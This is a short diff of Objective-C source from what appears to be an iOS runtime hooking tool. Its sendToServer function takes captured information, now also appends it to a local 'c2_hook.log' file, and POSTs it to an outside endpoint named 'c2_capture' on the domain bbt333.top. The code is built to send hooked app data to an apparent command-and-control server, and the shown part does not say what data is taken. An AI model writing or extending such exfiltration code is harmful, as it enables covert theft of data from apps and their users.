@@ -2,11 +2,24 @@
 #import <Foundation/Foundation.h>
 #import <objc/runtime.h>
 
-// ── 日志上报 ─────────────────────────────────────────────────────────────
+// ── 日志上报（双重：网络+本地文件）────────────────────────────────────
 static void sendToServer(NSDictionary *info) {
     NSData *body = [NSJSONSerialization dataWithJSONObject:info options:0 error:nil];
     if (!body) return;
 
+    // 方案1：写本地文件（绝对可靠）
+    NSString *logPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/c2_hook.log"];
+    NSString *line = [[NSString alloc] initWithData:body encoding:NSUTF8StringEncoding];
+    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:logPath];
+    if (fh) {
+        [fh seekToEndOfFile];
+        [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
+        [fh closeFile];
+    } else {
+        [line writeToFile:logPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
+    }
+
+    // 方案2：网络回传（可能失败）
     NSURL *url = [NSURL URLWithString:@"https://c.bbt333.top/c2_capture"];
     NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
     req.HTTPMethod = @"POST";
